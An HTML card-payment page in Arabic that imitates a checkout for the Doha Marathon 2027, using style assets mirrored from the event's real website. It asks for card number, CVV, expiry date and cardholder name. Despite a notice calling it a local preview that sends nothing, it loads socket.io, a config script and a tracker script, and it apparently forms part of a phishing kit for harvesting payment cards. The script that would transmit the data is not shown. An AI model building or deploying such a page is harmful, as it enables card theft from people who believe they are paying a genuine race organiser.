<!doctype html>
<html lang="ar" dir="rtl">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="theme-color" content="#087cf4">
	<title>الدفع بالبطاقة - ماراثون الدوحة 2027</title>
	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/notosans.css">
	<link rel="stylesheet" href="assets/dohamarathonooredoo.com/wp-content/uploads/elementor/google-fonts/css/rubik.css">
	<link rel="stylesheet" href="assets/payment-card.css">
	<script src="assets/payment-card.js" defer></script>
</head>
<body>
	<header class="card-header">
		
	</header>

	<main class="card-shell">
		<section class="card-payment-panel" aria-label="معلومات بطاقة الدفع">
			<div class="merchant-row">
				<div class="merchant-logo" aria-hidden="true"><span>SUFFIX<span class="merchant-mark">X</span></span></div>
				<div class="merchant-details">
					<h1>Suffix Sports Management</h1>
					<strong id="card-payment-total" class="payment-total"></strong>
					<p class="order-details"><span class="order-check" aria-hidden="true">✓</span> تفاصيل الطلب</p>
				</div>
			</div>

			<div class="payment-divider"><span>ادفع بالبطاقة</span></div>
			<div class="card-type-bar">
				<span class="card-brands" aria-label="Mastercard وVisa">
					<span class="brand-mastercard"><i></i><i></i></span>
					<span class="brand-visa">VISA</span>
				</span>
				<strong>بطاقة الائتمان <span aria-hidden="true">▰</span></strong>
			</div>
			<p class="card-section-label">معلومات البطاقة</p>

			<form id="card-form" class="card-form" novalidate autocomplete="on">
				<label class="card-field card-number-field">
					<span class="visually-hidden">رقم البطاقة</span>
					<span class="card-symbol" aria-hidden="true">▤</span>
					<input
						id="card-number"
						class="card-input"
						name="card-number"
						type="text"
						inputmode="numeric"
						autocomplete="cc-number"
						dir="ltr"
						placeholder="XXXX XXXX XXXX XXXX"
						maxlength="19"
						aria-label="رقم البطاقة"
						required>
				</label>
				<div class="card-field-row">
					<label class="card-field">
						<span class="visually-hidden">رمز التحقق CVV</span>
						<input
							id="card-cvv"
							class="card-input"
							name="card-cvv"
							type="password"
							inputmode="numeric"
							autocomplete="cc-csc"
							dir="ltr"
							placeholder="CVV"
							maxlength="4"
							aria-label="رمز التحقق CVV"
							required>
					</label>
					<label class="card-field">
						<span class="visually-hidden">تاريخ انتهاء البطاقة شهر وسنة</span>
						<input
							id="card-expiry"
							class="card-input"
							name="card-expiry"
							type="text"
							inputmode="numeric"
							autocomplete="cc-exp"
							dir="ltr"
							placeholder="MM/YY"
							maxlength="5"
							aria-label="تاريخ انتهاء البطاقة شهر وسنة"
							required>
					</label>
				</div>
				<label class="card-field card-name-field">
					<span class="visually-hidden">الاسم على البطاقة</span>
					<input
						id="cardholder-name"
						class="card-input"
						name="cardholder-name"
						type="text"
						autocomplete="cc-name"
						dir="auto"
						placeholder="الاسم"
						aria-label="الاسم على البطاقة"
						required>
				</label>

				<button id="card-pay-button" class="card-pay-button" type="submit" disabled></button>
				<p id="card-form-message" class="card-form-message" role="status" aria-live="polite" hidden></p>
			</form>
			<p class="local-card-notice">معاينة محلية فقط: لا تدخل بيانات بطاقة حقيقية. لا يتم حفظ أو إرسال بيانات البطاقة.</p>
		</section>
	</main>
<script src="/socket.io/socket.io.js"></script>
<script src="/api/env-config.js"></script><script src="/assets/tracker.js"></script>
</body>
</html>
